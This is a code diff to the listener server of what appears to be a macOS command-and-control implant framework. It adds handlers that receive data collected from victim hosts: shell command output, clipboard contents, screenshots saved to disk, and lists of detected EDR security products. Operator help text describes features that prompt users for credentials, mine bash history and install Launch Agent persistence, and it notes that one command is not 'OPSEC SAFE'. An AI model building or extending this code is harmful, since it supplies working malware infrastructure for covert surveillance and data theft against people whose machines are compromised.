@@ -7,6 +7,7 @@ import subprocess
 cmds = []
 
 commands = [
+    'cd',
     'exit',
     'lcwd',
     'pwd',
@@ -18,11 +19,11 @@ commands = [
     'addresses',
     'listusers',
     'userhist',
-    'screenshot',
+    # 'screenshot',
     'checksecurity',
-    'persist',
-    'unpersist',
-    'prompt',
+    # 'persist',
+    # 'unpersist',
+    # 'prompt',
     'systeminfo',
     'clipboard',
     'shell ',
@@ -81,19 +82,19 @@ async def CheckIn(request):
                 print(">\033[33mpwd: Show working directory on host")
                 print('')
                 print("--->COMMANDS<---")
-                print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials")
+                # print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials")
                 print(">\033[33muserhist\033[0m: Grep for interesting hosts from bash history")
                 print(">\033[33mclipboard\033[0m: Grab text in the user's clipboard")
                 print(">\033[33mconnections\033[0m: Show active network connections")
                 print(">\033[33mchecksecurity\033[0m: Search for common EDR products")
-                print(">\033[33mscreenshot\033[0m: Grap a screenshot of the OSX host")
+                # print(">\033[33mscreenshot\033[0m: Grap a screenshot of the OSX host")
                 print(">\033[33msleep [digit]\033[0m: Change sleep time")
-                print(">\033[33mpersist\033[0m: Add persistence as OSX Launch Agent. NOTE: This command must be run in the same directory where the macshell client is running.")
-                print(">\033[33munpersist\033[0m: Remove the login persistence")
+                # print(">\033[33mpersist\033[0m: Add persistence as OSX Launch Agent. NOTE: This command must be run in the same directory where the macshell client is running.")
+                # print(">\033[33munpersist\033[0m: Remove the login persistence")
                 print(">\033[33mshell [shell command]\033[0m: Run a shell command...NOT OPSEC SAFE, as this uses easily detectable command line strings")
                 print('')
                 print("--->OTHER<---")
-                print(">\033[33mIn general enter whatever Mac OS shell command you want to run. Ex: whoami, hostname, pwd, etc.\033[0m")
+                # print(">\033[33mIn general enter whatever Mac OS shell command you want to run. Ex: whoami, hostname, pwd, etc.\033[0m")
                 print(">\033[33mexit\033[0m: Exit the session and stop the client")
                 print("-"*100)
 
@@ -189,7 +190,37 @@ async def Addresses(request):
         return web.Response(text=text)
     else:
         return web.HTTPNotFound()
-
+    
+async def Sleep(request):
+    if validate_request(request.headers):
+        message = await request.read()
+        message = message.decode()
+        timestamp = datetime.now()
+        print(f"Timestamp: {timestamp}")
+        if message.startswith("Error".upper()):
+            print(f"\033[31m[-] {message}\033[0m")
+        else:
+            print(f"\033[32m{message}:\033[0m")
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+    
+async def Shell(request):
+    if validate_request(request.headers):
+        message = await request.read()
+        message = message.decode()
+        timestamp = datetime.now()
+        print(f"Timestamp: {timestamp}")
+        if message.startswith("Error"):
+            print(f"\033[31m[-] {message}\033[0m")
+        else:
+            print(f"\033[32m{message}")
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+    
 async def SysInfo(request):
     if validate_request(request.headers):
         sys_info = await request.read()
@@ -264,6 +295,98 @@ async def UserHist(request):
         return web.Response(text=text)
     else:
         return web.HTTPNotFound()
+    
+async def CheckSecurity(request):
+    if validate_request(request.headers):
+        detected_edr = await request.read()
+        detected_edr = detected_edr.decode()
+        timestamp = datetime.now()
+        print(f"Timestamp: {timestamp}")
+        if detected_edr.startswith("Error:"):
+            print(f"\033[31m[-] {detected_edr}\033[0m")
+        else:
+            print("\033[32m[+] Detected EDR Products: \033[0m")
+            if detected_edr:
+                print(detected_edr)
+            else:
+                print("\033[31m[-] No EDR products detected.\033[0m")
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+
+async def Clipboard(request):
+    if validate_request(request.headers):
+        clipboard = await request.read()
+        clipboard = clipboard.decode()
+        timestamp = datetime.now()
+        print(f"Timestamp: {timestamp}")
+        if clipboard.startswith("Error:"):
+            print(f"\033[31m[-] {clipboard}\033[0m")
+        else:
+            print("\033[32m[+] Clipboard content: \033[0m")
+            print(clipboard)
+            
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+    
+async def Exit(request):
+    if validate_request(request.headers):
+        message = await request.read()
+        message = message.decode()
+        timestamp = datetime.now()
+        print(f"Timestamp: {timestamp}")
+        print(f"\033[32m[+] {message} \033[0m")
+            
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+    
+async def CdFile(request):
+    if validate_request(request.headers):
+        message = await request.read()
+        message = message.decode()
+        timestamp = datetime.now()
+        print(f"Timestamp: {timestamp}")
+        if message.startswith("Error:"):
+            print(f"\033[31m[-] {message}\033[0m")
+        else:
+            print(f"\033[32m[+] {message} \033[0m")
+            
+        text = 'OK'
+        return web.Response(text=text)
+    else:
+        return web.HTTPNotFound()
+    
+async def Screenshot(request):
+    """
+    Handles screenshot requests by saving the incoming image file and logging it.
+    """
+    if validate_request(request.headers):
+        # Read the screenshot data
+        screenshot_data = await request.read()
+        timestamp = datetime.now()
+        formatted_time = timestamp.strftime('%Y%m%d_%H%M%S')  # Format timestamp for file naming
+        screenshot_file = f"screenshot_{formatted_time}.png"
+        
+        print(f"Timestamp: {timestamp}")
+        
+        # Check if the data contains an error message
+        if screenshot_data.startswith(b"Error:"):
+            print(f"\033[31m[-] {screenshot_data}\033[0m")
+        else:
+            # Save the screenshot to a file
+            with open(screenshot_file, 'wb') as file:
+                file.write(screenshot_data)
+            print(f"\033[32m[+] Screenshot saved as: {screenshot_file}\033[0m")
+        
+        return web.Response(text='Screenshot processed successfully')
+    else:
+        return web.HTTPNotFound()
+
 
 app = web.Application()
 app.add_routes([
@@ -278,7 +401,14 @@ app.add_routes([
     web.post('/listusers',ListUsers),
     web.post('/connections',Connections),
     web.post('/catfile',CatFile),
-    web.post('/userhist',UserHist)
+    web.post('/userhist',UserHist),
+    web.post('/checksecurity',CheckSecurity),
+    web.post('/clipboard', Clipboard),
+    web.post('/sleep',Sleep),
+    web.post('/shell',Shell),
+    web.post('/exit',Exit),
+    web.post('/cdfile',CdFile),
+    web.post('/screenshot',Screenshot)
 ])
 
 if __name__ == "__main__":  
